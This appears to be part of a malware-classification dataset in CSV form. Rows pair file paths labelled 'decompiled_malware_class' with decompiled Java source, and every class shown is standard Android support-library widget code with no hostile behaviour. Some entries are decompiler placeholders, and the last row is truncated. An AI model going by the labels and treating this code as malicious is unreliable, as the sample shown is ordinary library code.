"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ContentLoadingProgressBar.code","public class ContentLoadingProgressBar extends ProgressBar {   private static final int MIN_DELAY=500;   private static final int MIN_SHOW_TIME=500;   private final Runnable mDelayedHide;   private final Runnable mDelayedShow;   private boolean mDismissed;   private boolean mPostedHide;   private boolean mPostedShow;   private long mStartTime;   public ContentLoadingProgressBar(  Context context){     this(context,null);   }   public ContentLoadingProgressBar(  Context context,  AttributeSet attrs){     super(context,attrs,0);     this.mStartTime=-1L;     this.mPostedHide=false;     this.mPostedShow=false;     this.mDismissed=false;     this.mDelayedHide=new Runnable(){       @Override public void run(){         ContentLoadingProgressBar.this.mPostedHide=false;         ContentLoadingProgressBar.this.mStartTime=-1L;         ContentLoadingProgressBar.this.setVisibility(8);       }     } ;     this.mDelayedShow=new Runnable(){       @Override public void run(){         ContentLoadingProgressBar.this.mPostedShow=false;         if (!ContentLoadingProgressBar.this.mDismissed) {           ContentLoadingProgressBar.this.mStartTime=System.currentTimeMillis();           ContentLoadingProgressBar.this.setVisibility(0);         }       }     } ;   }   @Override public void onAttachedToWindow(){     super.onAttachedToWindow();     removeCallbacks();   }   @Override public void onDetachedFromWindow(){     super.onDetachedFromWindow();     removeCallbacks();   }   private void removeCallbacks(){     removeCallbacks(this.mDelayedHide);     removeCallbacks(this.mDelayedShow);   }   public void hide(){     this.mDismissed=true;     removeCallbacks(this.mDelayedShow);     long diff=System.currentTimeMillis() - this.mStartTime;     if (diff >= 500 || this.mStartTime == -1) {       setVisibility(8);     }  else     if (!this.mPostedHide) {       postDelayed(this.mDelayedHide,500 - diff);       this.mPostedHide=true;     }   }   public void show(){     this.mStartTime=-1L;     this.mDismissed=false;     removeCallbacks(this.mDelayedHide);     if (!this.mPostedShow) {       postDelayed(this.mDelayedShow,500L);       this.mPostedShow=true;     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\CursorAdapter.code","public abstract class CursorAdapter extends BaseAdapter implements Filterable, CursorFilter.CursorFilterClient {   @Deprecated public static final int FLAG_AUTO_REQUERY=1;   public static final int FLAG_REGISTER_CONTENT_OBSERVER=2;   protected boolean mAutoRequery;   protected ChangeObserver mChangeObserver;   protected Context mContext;   protected Cursor mCursor;   protected CursorFilter mCursorFilter;   protected DataSetObserver mDataSetObserver;   protected boolean mDataValid;   protected FilterQueryProvider mFilterQueryProvider;   protected int mRowIDColumn;   public abstract void bindView(  View view,  Context context,  Cursor cursor);   public abstract View newView(  Context context,  Cursor cursor,  ViewGroup viewGroup);   @Deprecated public CursorAdapter(  Context context,  Cursor c){     init(context,c,1);   }   public CursorAdapter(  Context context,  Cursor c,  boolean autoRequery){     init(context,c,autoRequery ? 1 : 2);   }   public CursorAdapter(  Context context,  Cursor c,  int flags){     init(context,c,flags);   }   @Deprecated protected void init(  Context context,  Cursor c,  boolean autoRequery){     init(context,c,autoRequery ? 1 : 2);   }   void init(  Context context,  Cursor c,  int flags){     if ((flags & 1) == 1) {       flags|=2;       this.mAutoRequery=true;     }  else {       this.mAutoRequery=false;     }     boolean cursorPresent=c != null;     this.mCursor=c;     this.mDataValid=cursorPresent;     this.mContext=context;     this.mRowIDColumn=cursorPresent ? c.getColumnIndexOrThrow(""_id"") : -1;     if ((flags & 2) == 2) {       this.mChangeObserver=new ChangeObserver();       this.mDataSetObserver=new MyDataSetObserver();     }  else {       this.mChangeObserver=null;       this.mDataSetObserver=null;     }     if (cursorPresent) {       if (this.mChangeObserver != null) {         c.registerContentObserver(this.mChangeObserver);       }       if (this.mDataSetObserver != null) {         c.registerDataSetObserver(this.mDataSetObserver);       }     }   }   @Override public Cursor getCursor(){     return this.mCursor;   }   @Override public int getCount(){     if (!this.mDataValid || this.mCursor == null) {       return 0;     }     return this.mCursor.getCount();   }   @Override public Object getItem(  int position){     if (!this.mDataValid || this.mCursor == null) {       return null;     }     this.mCursor.moveToPosition(position);     return this.mCursor;   }   @Override public long getItemId(  int position){     if (this.mDataValid && this.mCursor != null && this.mCursor.moveToPosition(position)) {       return this.mCursor.getLong(this.mRowIDColumn);     }     return 0L;   }   @Override public boolean hasStableIds(){     return true;   }   @Override public View getView(  int position,  View convertView,  ViewGroup parent){     View v;     if (!this.mDataValid) {       throw new IllegalStateException(""this should only be called when the cursor is valid"");     }     if (!this.mCursor.moveToPosition(position)) {       throw new IllegalStateException(""couldn't move cursor to position "" + position);     }     if (convertView == null) {       v=newView(this.mContext,this.mCursor,parent);     }  else {       v=convertView;     }     bindView(v,this.mContext,this.mCursor);     return v;   }   @Override public View getDropDownView(  int position,  View convertView,  ViewGroup parent){     View v;     if (this.mDataValid) {       this.mCursor.moveToPosition(position);       if (convertView == null) {         v=newDropDownView(this.mContext,this.mCursor,parent);       }  else {         v=convertView;       }       bindView(v,this.mContext,this.mCursor);       return v;     }     return null;   }   public View newDropDownView(  Context context,  Cursor cursor,  ViewGroup parent){     return newView(context,cursor,parent);   }   @Override public void changeCursor(  Cursor cursor){     Cursor old=swapCursor(cursor);     if (old != null) {       old.close();     }   }   public Cursor swapCursor(  Cursor newCursor){     if (newCursor == this.mCursor) {       return null;     }     Cursor oldCursor=this.mCursor;     if (oldCursor != null) {       if (this.mChangeObserver != null) {         oldCursor.unregisterContentObserver(this.mChangeObserver);       }       if (this.mDataSetObserver != null) {         oldCursor.unregisterDataSetObserver(this.mDataSetObserver);       }     }     this.mCursor=newCursor;     if (newCursor != null) {       if (this.mChangeObserver != null) {         newCursor.registerContentObserver(this.mChangeObserver);       }       if (this.mDataSetObserver != null) {         newCursor.registerDataSetObserver(this.mDataSetObserver);       }       this.mRowIDColumn=newCursor.getColumnIndexOrThrow(""_id"");       this.mDataValid=true;       notifyDataSetChanged();       return oldCursor;     }     this.mRowIDColumn=-1;     this.mDataValid=false;     notifyDataSetInvalidated();     return oldCursor;   }   @Override public CharSequence convertToString(  Cursor cursor){     return cursor == null ? """" : cursor.toString();   }   @Override public Cursor runQueryOnBackgroundThread(  CharSequence constraint){     return this.mFilterQueryProvider != null ? this.mFilterQueryProvider.runQuery(constraint) : this.mCursor;   }   @Override public Filter getFilter(){     if (this.mCursorFilter == null) {       this.mCursorFilter=new CursorFilter(this);     }     return this.mCursorFilter;   }   public FilterQueryProvider getFilterQueryProvider(){     return this.mFilterQueryProvider;   }   public void setFilterQueryProvider(  FilterQueryProvider filterQueryProvider){     this.mFilterQueryProvider=filterQueryProvider;   }   protected void onContentChanged(){     if (this.mAutoRequery && this.mCursor != null && !this.mCursor.isClosed()) {       this.mDataValid=this.mCursor.requery();     }   } public class ChangeObserver extends ContentObserver {     public ChangeObserver(){       super(new Handler());     }     @Override public boolean deliverSelfNotifications(){       return true;     }     @Override public void onChange(    boolean selfChange){       CursorAdapter.this.onContentChanged();     }   } public class MyDataSetObserver extends DataSetObserver {     private MyDataSetObserver(){     }     @Override public void onChanged(){       CursorAdapter.this.mDataValid=true;       CursorAdapter.this.notifyDataSetChanged();     }     @Override public void onInvalidated(){       CursorAdapter.this.mDataValid=false;       CursorAdapter.this.notifyDataSetInvalidated();     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\CursorFilter.code","class CursorFilter extends Filter {   CursorFilterClient mClient; interface CursorFilterClient {     void changeCursor(    Cursor cursor);     CharSequence convertToString(    Cursor cursor);     Cursor getCursor();     Cursor runQueryOnBackgroundThread(    CharSequence charSequence);   }   public CursorFilter(  CursorFilterClient client){     this.mClient=client;   }   @Override public CharSequence convertResultToString(  Object resultValue){     return this.mClient.convertToString((Cursor)resultValue);   }   @Override protected Filter.FilterResults performFiltering(  CharSequence constraint){     Cursor cursor=this.mClient.runQueryOnBackgroundThread(constraint);     Filter.FilterResults results=new Filter.FilterResults();     if (cursor != null) {       results.count=cursor.getCount();       results.values=cursor;     }  else {       results.count=0;       results.values=null;     }     return results;   }   @Override protected void publishResults(  CharSequence constraint,  Filter.FilterResults results){     Cursor oldCursor=this.mClient.getCursor();     if (results.values != null && results.values != oldCursor) {       this.mClient.changeCursor((Cursor)results.values);     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\CursorFilterClient.code","interface CursorFilterClient {   void changeCursor(  Cursor cursor);   CharSequence convertToString(  Cursor cursor);   Cursor getCursor();   Cursor runQueryOnBackgroundThread(  CharSequence charSequence); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\CursorToStringConverter.code","public interface CursorToStringConverter {   CharSequence convertToString(  Cursor cursor); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\DisableLayerRunnable.code","public class DisableLayerRunnable implements Runnable {   final View mChildView;   DisableLayerRunnable(  View childView){     this.mChildView=childView;   }   @Override public void run(){     if (this.mChildView.getParent() == SlidingPaneLayout.this) {       ViewCompat.setLayerType(this.mChildView,0,null);       SlidingPaneLayout.this.invalidateChildRegion(this.mChildView);     }     SlidingPaneLayout.this.mPostedRunnables.remove(this);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\DragHelperCallback.code","private class DragHelperCallback extends ViewDragHelper.Callback {   private DragHelperCallback(){   }   @Override public boolean tryCaptureView(  View child,  int pointerId){     if (SlidingPaneLayout.this.mIsUnableToDrag) {       return false;     }     return ((LayoutParams)child.getLayoutParams()).slideable;   }   @Override public void onViewDragStateChanged(  int state){     if (SlidingPaneLayout.this.mDragHelper.getViewDragState() == 0) {       if (SlidingPaneLayout.this.mSlideOffset == 0.0f) {         SlidingPaneLayout.this.updateObscuredViewsVisibility(SlidingPaneLayout.this.mSlideableView);         SlidingPaneLayout.this.dispatchOnPanelClosed(SlidingPaneLayout.this.mSlideableView);         SlidingPaneLayout.this.mPreservedOpenState=false;       }  else {         SlidingPaneLayout.this.dispatchOnPanelOpened(SlidingPaneLayout.this.mSlideableView);         SlidingPaneLayout.this.mPreservedOpenState=true;       }     }   }   @Override public void onViewCaptured(  View capturedChild,  int activePointerId){     SlidingPaneLayout.this.setAllChildrenVisible();   }   @Override public void onViewPositionChanged(  View changedView,  int left,  int top,  int dx,  int dy){     SlidingPaneLayout.this.onPanelDragged(left);     SlidingPaneLayout.this.invalidate();   }   @Override public void onViewReleased(  View releasedChild,  float xvel,  float yvel){     LayoutParams lp=(LayoutParams)releasedChild.getLayoutParams();     int left=SlidingPaneLayout.this.getPaddingLeft() + lp.leftMargin;     if (xvel > 0.0f || (xvel == 0.0f && SlidingPaneLayout.this.mSlideOffset > 0.5f)) {       left+=SlidingPaneLayout.this.mSlideRange;     }     SlidingPaneLayout.this.mDragHelper.settleCapturedViewAt(left,releasedChild.getTop());     SlidingPaneLayout.this.invalidate();   }   @Override public int getViewHorizontalDragRange(  View child){     return SlidingPaneLayout.this.mSlideRange;   }   @Override public int clampViewPositionHorizontal(  View child,  int left,  int dx){     LayoutParams lp=(LayoutParams)SlidingPaneLayout.this.mSlideableView.getLayoutParams();     int leftBound=SlidingPaneLayout.this.getPaddingLeft() + lp.leftMargin;     int rightBound=leftBound + SlidingPaneLayout.this.mSlideRange;     int newLeft=Math.min(Math.max(left,leftBound),rightBound);     return newLeft;   }   @Override public void onEdgeDragStarted(  int edgeFlags,  int pointerId){     SlidingPaneLayout.this.mDragHelper.captureChildView(SlidingPaneLayout.this.mSlideableView,pointerId);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\DrawerLayout.code","!org.eclipse.jdt.core.dom.TypeDeclaration@62bf2c32"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\DrawerListener.code","public interface DrawerListener {   void onDrawerClosed(  View view);   void onDrawerOpened(  View view);   void onDrawerSlide(  View view,  float f);   void onDrawerStateChanged(  int i); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\EdgeEffectCompat.code","public class EdgeEffectCompat {   private static final EdgeEffectImpl IMPL;   private Object mEdgeEffect; interface EdgeEffectImpl {     boolean draw(    Object obj,    Canvas canvas);     void finish(    Object obj);     boolean isFinished(    Object obj);     Object newEdgeEffect(    Context context);     boolean onAbsorb(    Object obj,    int i);     boolean onPull(    Object obj,    float f);     boolean onRelease(    Object obj);     void setSize(    Object obj,    int i,    int i2);   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new EdgeEffectIcsImpl();     }  else {       IMPL=new BaseEdgeEffectImpl();     }   } static class BaseEdgeEffectImpl implements EdgeEffectImpl {     BaseEdgeEffectImpl(){     }     @Override public Object newEdgeEffect(    Context context){       return null;     }     @Override public void setSize(    Object edgeEffect,    int width,    int height){     }     @Override public boolean isFinished(    Object edgeEffect){       return true;     }     @Override public void finish(    Object edgeEffect){     }     @Override public boolean onPull(    Object edgeEffect,    float deltaDistance){       return false;     }     @Override public boolean onRelease(    Object edgeEffect){       return false;     }     @Override public boolean onAbsorb(    Object edgeEffect,    int velocity){       return false;     }     @Override public boolean draw(    Object edgeEffect,    Canvas canvas){       return false;     }   } static class EdgeEffectIcsImpl implements EdgeEffectImpl {     EdgeEffectIcsImpl(){     }     @Override public Object newEdgeEffect(    Context context){       return EdgeEffectCompatIcs.newEdgeEffect(context);     }     @Override public void setSize(    Object edgeEffect,    int width,    int height){       EdgeEffectCompatIcs.setSize(edgeEffect,width,height);     }     @Override public boolean isFinished(    Object edgeEffect){       return EdgeEffectCompatIcs.isFinished(edgeEffect);     }     @Override public void finish(    Object edgeEffect){       EdgeEffectCompatIcs.finish(edgeEffect);     }     @Override public boolean onPull(    Object edgeEffect,    float deltaDistance){       return EdgeEffectCompatIcs.onPull(edgeEffect,deltaDistance);     }     @Override public boolean onRelease(    Object edgeEffect){       return EdgeEffectCompatIcs.onRelease(edgeEffect);     }     @Override public boolean onAbsorb(    Object edgeEffect,    int velocity){       return EdgeEffectCompatIcs.onAbsorb(edgeEffect,velocity);     }     @Override public boolean draw(    Object edgeEffect,    Canvas canvas){       return EdgeEffectCompatIcs.draw(edgeEffect,canvas);     }   }   public EdgeEffectCompat(  Context context){     this.mEdgeEffect=IMPL.newEdgeEffect(context);   }   public void setSize(  int width,  int height){     IMPL.setSize(this.mEdgeEffect,width,height);   }   public boolean isFinished(){     return IMPL.isFinished(this.mEdgeEffect);   }   public void finish(){     IMPL.finish(this.mEdgeEffect);   }   public boolean onPull(  float deltaDistance){     return IMPL.onPull(this.mEdgeEffect,deltaDistance);   }   public boolean onRelease(){     return IMPL.onRelease(this.mEdgeEffect);   }   public boolean onAbsorb(  int velocity){     return IMPL.onAbsorb(this.mEdgeEffect,velocity);   }   public boolean draw(  Canvas canvas){     return IMPL.draw(this.mEdgeEffect,canvas);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\EdgeEffectCompatIcs.code","class EdgeEffectCompatIcs {   EdgeEffectCompatIcs(){   }   public static Object newEdgeEffect(  Context context){     return new EdgeEffect(context);   }   public static void setSize(  Object edgeEffect,  int width,  int height){     ((EdgeEffect)edgeEffect).setSize(width,height);   }   public static boolean isFinished(  Object edgeEffect){     return ((EdgeEffect)edgeEffect).isFinished();   }   public static void finish(  Object edgeEffect){     ((EdgeEffect)edgeEffect).finish();   }   public static boolean onPull(  Object edgeEffect,  float deltaDistance){     ((EdgeEffect)edgeEffect).onPull(deltaDistance);     return true;   }   public static boolean onRelease(  Object edgeEffect){     EdgeEffect eff=(EdgeEffect)edgeEffect;     eff.onRelease();     return eff.isFinished();   }   public static boolean onAbsorb(  Object edgeEffect,  int velocity){     ((EdgeEffect)edgeEffect).onAbsorb(velocity);     return true;   }   public static boolean draw(  Object edgeEffect,  Canvas canvas){     return ((EdgeEffect)edgeEffect).draw(canvas);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\EdgeEffectIcsImpl.code","static class EdgeEffectIcsImpl implements EdgeEffectImpl {   EdgeEffectIcsImpl(){   }   @Override public Object newEdgeEffect(  Context context){     return EdgeEffectCompatIcs.newEdgeEffect(context);   }   @Override public void setSize(  Object edgeEffect,  int width,  int height){     EdgeEffectCompatIcs.setSize(edgeEffect,width,height);   }   @Override public boolean isFinished(  Object edgeEffect){     return EdgeEffectCompatIcs.isFinished(edgeEffect);   }   @Override public void finish(  Object edgeEffect){     EdgeEffectCompatIcs.finish(edgeEffect);   }   @Override public boolean onPull(  Object edgeEffect,  float deltaDistance){     return EdgeEffectCompatIcs.onPull(edgeEffect,deltaDistance);   }   @Override public boolean onRelease(  Object edgeEffect){     return EdgeEffectCompatIcs.onRelease(edgeEffect);   }   @Override public boolean onAbsorb(  Object edgeEffect,  int velocity){     return EdgeEffectCompatIcs.onAbsorb(edgeEffect,velocity);   }   @Override public boolean draw(  Object edgeEffect,  Canvas canvas){     return EdgeEffectCompatIcs.draw(edgeEffect,canvas);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\EdgeEffectImpl.code","interface EdgeEffectImpl {   boolean draw(  Object obj,  Canvas canvas);   void finish(  Object obj);   boolean isFinished(  Object obj);   Object newEdgeEffect(  Context context);   boolean onAbsorb(  Object obj,  int i);   boolean onPull(  Object obj,  float f);   boolean onRelease(  Object obj);   void setSize(  Object obj,  int i,  int i2); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ExploreByTouchHelper.code","!org.eclipse.jdt.core.dom.TypeDeclaration@214a0c2a"
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ExploreByTouchNodeProvider.code","private class ExploreByTouchNodeProvider extends AccessibilityNodeProviderCompat {   private ExploreByTouchNodeProvider(){   }   @Override public AccessibilityNodeInfoCompat createAccessibilityNodeInfo(  int virtualViewId){     return ExploreByTouchHelper.this.createNode(virtualViewId);   }   @Override public boolean performAction(  int virtualViewId,  int action,  Bundle arguments){     return ExploreByTouchHelper.this.performAction(virtualViewId,action,arguments);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\KitKatListPopupWindowImpl.code","static class KitKatListPopupWindowImpl extends BaseListPopupWindowImpl {   KitKatListPopupWindowImpl(){   }   @Override public View.OnTouchListener createDragToOpenListener(  Object listPopupWindow,  View src){     return ListPopupWindowCompatKitKat.createDragToOpenListener(listPopupWindow,src);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\KitKatPopupMenuImpl.code","static class KitKatPopupMenuImpl extends BasePopupMenuImpl {   KitKatPopupMenuImpl(){   }   @Override public View.OnTouchListener getDragToOpenListener(  Object popupMenu){     return PopupMenuCompatKitKat.getDragToOpenListener(popupMenu);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\LayoutParams.code","public static class LayoutParams extends ViewGroup.MarginLayoutParams {   public int gravity;   boolean isPeeking;   boolean knownOpen;   float onScreen;   public LayoutParams(  Context c,  AttributeSet attrs){     super(c,attrs);     this.gravity=0;     TypedArray a=c.obtainStyledAttributes(attrs,DrawerLayout.LAYOUT_ATTRS);     this.gravity=a.getInt(0,0);     a.recycle();   }   public LayoutParams(  int width,  int height){     super(width,height);     this.gravity=0;   }   public LayoutParams(  int width,  int height,  int gravity){     this(width,height);     this.gravity=gravity;   }   public LayoutParams(  LayoutParams source){     super((ViewGroup.MarginLayoutParams)source);     this.gravity=0;     this.gravity=source.gravity;   }   public LayoutParams(  ViewGroup.LayoutParams source){     super(source);     this.gravity=0;   }   public LayoutParams(  ViewGroup.MarginLayoutParams source){     super(source);     this.gravity=0;   } } public static class LayoutParams extends ViewGroup.MarginLayoutParams {   private static final int[] ATTRS={R.attr.layout_weight};   Paint dimPaint;   boolean dimWhenOffset;   boolean slideable;   public float weight;   public LayoutParams(){     super(-1,-1);     this.weight=0.0f;   }   public LayoutParams(  int width,  int height){     super(width,height);     this.weight=0.0f;   }   public LayoutParams(  ViewGroup.LayoutParams source){     super(source);     this.weight=0.0f;   }   public LayoutParams(  ViewGroup.MarginLayoutParams source){     super(source);     this.weight=0.0f;   }   public LayoutParams(  LayoutParams source){     super((ViewGroup.MarginLayoutParams)source);     this.weight=0.0f;     this.weight=source.weight;   }   public LayoutParams(  Context c,  AttributeSet attrs){     super(c,attrs);     this.weight=0.0f;     TypedArray a=c.obtainStyledAttributes(attrs,ATTRS);     this.weight=a.getFloat(0,0.0f);     a.recycle();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ListPopupWindowCompat.code","public class ListPopupWindowCompat {   static final ListPopupWindowImpl IMPL; interface ListPopupWindowImpl {     View.OnTouchListener createDragToOpenListener(    Object obj,    View view);   } static class BaseListPopupWindowImpl implements ListPopupWindowImpl {     BaseListPopupWindowImpl(){     }     @Override public View.OnTouchListener createDragToOpenListener(    Object listPopupWindow,    View src){       return null;     }   } static class KitKatListPopupWindowImpl extends BaseListPopupWindowImpl {     KitKatListPopupWindowImpl(){     }     @Override public View.OnTouchListener createDragToOpenListener(    Object listPopupWindow,    View src){       return ListPopupWindowCompatKitKat.createDragToOpenListener(listPopupWindow,src);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       IMPL=new KitKatListPopupWindowImpl();     }  else {       IMPL=new BaseListPopupWindowImpl();     }   }   private ListPopupWindowCompat(){   }   public static View.OnTouchListener createDragToOpenListener(  Object listPopupWindow,  View src){     return IMPL.createDragToOpenListener(listPopupWindow,src);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ListPopupWindowCompatKitKat.code","class ListPopupWindowCompatKitKat {   ListPopupWindowCompatKitKat(){   }   public static View.OnTouchListener createDragToOpenListener(  Object listPopupWindow,  View src){     return ((ListPopupWindow)listPopupWindow).createDragToOpenListener(src);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ListPopupWindowImpl.code","interface ListPopupWindowImpl {   View.OnTouchListener createDragToOpenListener(  Object obj,  View view); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ListViewAutoScrollHelper.code","public class ListViewAutoScrollHelper extends AutoScrollHelper {   private final ListView mTarget;   public ListViewAutoScrollHelper(  ListView target){     super(target);     this.mTarget=target;   }   @Override public void scrollTargetBy(  int deltaX,  int deltaY){     View firstView;     ListView target=this.mTarget;     int firstPosition=target.getFirstVisiblePosition();     if (firstPosition != -1 && (firstView=target.getChildAt(0)) != null) {       int newTop=firstView.getTop() - deltaY;       target.setSelectionFromTop(firstPosition,newTop);     }   }   @Override public boolean canTargetScrollHorizontally(  int direction){     return false;   }   @Override public boolean canTargetScrollVertically(  int direction){     ListView target=this.mTarget;     int itemCount=target.getCount();     int childCount=target.getChildCount();     int firstPosition=target.getFirstVisiblePosition();     int lastPosition=firstPosition + childCount;     if (direction > 0) {       if (lastPosition >= itemCount) {         View lastView=target.getChildAt(childCount - 1);         if (lastView.getBottom() <= target.getHeight()) {           return false;         }       }     }  else {       if (direction >= 0) {         return false;       }       if (firstPosition <= 0) {         View firstView=target.getChildAt(0);         if (firstView.getTop() >= 0) {           return false;         }       }     }     return true;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\MyDataSetObserver.code","public class MyDataSetObserver extends DataSetObserver {   private MyDataSetObserver(){   }   @Override public void onChanged(){     CursorAdapter.this.mDataValid=true;     CursorAdapter.this.notifyDataSetChanged();   }   @Override public void onInvalidated(){     CursorAdapter.this.mDataValid=false;     CursorAdapter.this.notifyDataSetInvalidated();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\MySearchView.code","public static class MySearchView extends SearchView {   public MySearchView(  Context context){     super(context);   }   @Override public void onActionViewCollapsed(){     setQuery("""",false);     super.onActionViewCollapsed();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\OnCloseListenerCompat.code","public static abstract class OnCloseListenerCompat {   final Object mListener=SearchViewCompat.IMPL.newOnCloseListener(this);   public boolean onClose(){     return false;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\OnCloseListenerCompatBridge.code","interface OnCloseListenerCompatBridge {   boolean onClose(); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\OnQueryTextListenerCompat.code","public static abstract class OnQueryTextListenerCompat {   final Object mListener=SearchViewCompat.IMPL.newOnQueryTextListener(this);   public boolean onQueryTextSubmit(  String query){     return false;   }   public boolean onQueryTextChange(  String newText){     return false;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\OnQueryTextListenerCompatBridge.code","interface OnQueryTextListenerCompatBridge {   boolean onQueryTextChange(  String str);   boolean onQueryTextSubmit(  String str); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\PanelSlideListener.code","public interface PanelSlideListener {   void onPanelClosed(  View view);   void onPanelOpened(  View view);   void onPanelSlide(  View view,  float f); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\PopupMenuCompat.code","public class PopupMenuCompat {   static final PopupMenuImpl IMPL; interface PopupMenuImpl {     View.OnTouchListener getDragToOpenListener(    Object obj);   } static class BasePopupMenuImpl implements PopupMenuImpl {     BasePopupMenuImpl(){     }     @Override public View.OnTouchListener getDragToOpenListener(    Object popupMenu){       return null;     }   } static class KitKatPopupMenuImpl extends BasePopupMenuImpl {     KitKatPopupMenuImpl(){     }     @Override public View.OnTouchListener getDragToOpenListener(    Object popupMenu){       return PopupMenuCompatKitKat.getDragToOpenListener(popupMenu);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 19) {       IMPL=new KitKatPopupMenuImpl();     }  else {       IMPL=new BasePopupMenuImpl();     }   }   private PopupMenuCompat(){   }   public static View.OnTouchListener getDragToOpenListener(  Object popupMenu){     return IMPL.getDragToOpenListener(popupMenu);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\PopupMenuCompatKitKat.code","class PopupMenuCompatKitKat {   PopupMenuCompatKitKat(){   }   public static View.OnTouchListener getDragToOpenListener(  Object popupMenu){     return ((PopupMenu)popupMenu).getDragToOpenListener();   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\PopupMenuImpl.code","interface PopupMenuImpl {   View.OnTouchListener getDragToOpenListener(  Object obj); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.widget\ResourceCursorAdapter.code","public abstract class ResourceCursorAdapter extends CursorAdapter {   private int mDropDownLayout;   private LayoutInflater mInflater;   private int mLayout;   @Deprecated public ResourceCursorAdapter(  Context context,  int layout,  Cursor c){     super(context,c);     this.mDropDownLayout=layout;     this.mLayout=layout;     this.mInflater=(LayoutInflater)context.getSystemService(""layout_inflater"");   }   public ResourceCursorAdapter(  Context context,  int layout,  Cursor c,  boolean autoRequery){     super(context,c,autoRequery);     this.mDropDownLayout=layout;     this.mLayout=layout;     this.mInflater=(LayoutInflater)context.getSystemService(""layout_inflater"");   }   public ResourceCursorAdapter(  Context context,  int layout,  Cursor c,  int flags){     super(context,c,flags);     this.mDropDownLayout=layout;     this.mLayout=layout;     this.mInflater=(LayoutInflater)context.getSystemService(""layout_inflater"");   }   @Override public View newView(  Context context,  Cursor cursor,  ViewGroup parent){     return this.mInflater.inflate(this.mLayout,parent,false);   }   @Override public View newDropDownView(  Context context,  Cursor cursor,  ViewGroup parent){     return this.mInflater.inflate(this.mDropDownLayout,parent,false);   }   public void setViewResource(  int layout){     this.mLayout=layout;   }   public void setDropDownViewResource(  